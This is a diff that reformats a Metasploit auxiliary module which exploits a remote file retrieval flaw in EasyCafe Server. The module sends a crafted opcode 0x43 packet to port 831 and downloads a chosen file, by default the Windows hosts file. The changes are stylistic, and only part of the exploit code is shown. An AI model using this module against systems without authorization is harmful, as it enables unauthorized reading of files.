@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -12,35 +13,35 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'EasyCafe Server Remote File Access',
-      'Description' => %q{
-          This module exploits a file retrieval vulnerability in
-        EasyCafe Server. The vulnerability can be triggered by
-        sending a specially crafted packet (opcode 0x43) to the
-        831/TCP port.
-        This module has been successfully tested on EasyCafe Server
-        version 2.2.14 (Trial mode and Demo mode) on Windows XP SP3
-        and Windows 7 SP1.
-        Note that the server will throw a popup messagebox if the
-        specified file does not exist.
-      },
-      'License'     => MSF_LICENSE,
-      'Author'      =>
-        [
-          'R-73eN', # Vulnerability Discovery
-          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit module
-        ],
-      'References'  =>
-        [
-          [ 'EDB', '39102' ]
-        ]
-    ))
+                      'Name'        => 'EasyCafe Server Remote File Access',
+                      'Description' => %q{
+                          This module exploits a file retrieval vulnerability in
+                        EasyCafe Server. The vulnerability can be triggered by
+                        sending a specially crafted packet (opcode 0x43) to the
+                        831/TCP port.
+                        This module has been successfully tested on EasyCafe Server
+                        version 2.2.14 (Trial mode and Demo mode) on Windows XP SP3
+                        and Windows 7 SP1.
+                        Note that the server will throw a popup messagebox if the
+                        specified file does not exist.
+                      },
+                      'License'     => MSF_LICENSE,
+                      'Author'      =>
+                        [
+                          'R-73eN', # Vulnerability Discovery
+                          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit module
+                        ],
+                      'References'  =>
+                        [
+                          [ 'EDB', '39102' ]
+                        ]))
 
     register_options(
       [
         Opt::RPORT(831),
         OptString.new('FILEPATH', [true, 'The path of the file to download', 'C:\\WINDOWS\\system32\\drivers\\etc\\hosts'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def get_file
@@ -57,9 +58,7 @@ class MetasploitModule < Msf::Auxiliary
 
     file_size = res.unpack('@256V')[0]
     contents = ''
-    while contents.length < file_size
-      contents << sock.get_once
-    end
+    contents << sock.get_once while contents.length < file_size
 
     print_status("File retrieved successfully (#{contents.length} bytes)!")
     contents
